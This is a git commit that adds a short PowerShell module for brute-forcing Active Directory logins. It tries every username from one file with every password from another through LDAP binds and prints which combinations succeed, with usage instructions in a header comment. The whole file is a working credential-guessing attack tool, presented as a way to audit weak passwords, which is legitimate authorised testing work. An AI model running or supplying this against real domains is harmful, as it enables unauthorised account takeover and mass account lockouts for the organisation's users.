20f864028af799e4b7461cf45bbe1db9ecd69f73
stschulznz <stefan@nearfaraway.com>
2022-01-20 11:43:24 +1300

    Add files via upload

---
+++ adbruteforce.psm1
@@ -0,0 +1,28 @@
+﻿<# 
+This very basic PowerShell script has been created to test for weak Active Directory passwords using the users/passwords specified in userlist/passwordlist files.
+First, import the script (import-module adbruteforce.psm1). Then execute as per: adbruteforce <userlist.txt> <AD domain> <passwordlist.txt>.
+ #>
+Function testlogin {
+    param($u,$p)
+    $null -ne (new-object directoryservices.directoryentry "",$u,$p).psbase.name
+  }
+   
+  Function adbruteforce {
+    param($userlist,$addomain,$passswordlist)
+  
+    if (!$passswordlist) {
+      Write-Host "Usage: adbruteforce <userlist.txt> <AD domain> <passwordlist.txt>"
+      Write-Host "Example: adbruteforce users.txt addomain.com passwords.txt`n"
+      return
+    }
+  
+    foreach($line1 in gc $userlist) {
+        foreach($line2 in gc $passswordlist) {
+
+      $output = "$line1,$line2,"
+      $output += testlogin "$addomain\$line1" "$line2"
+      Write-Host "$output"
+    }
+      
+    }
+  }
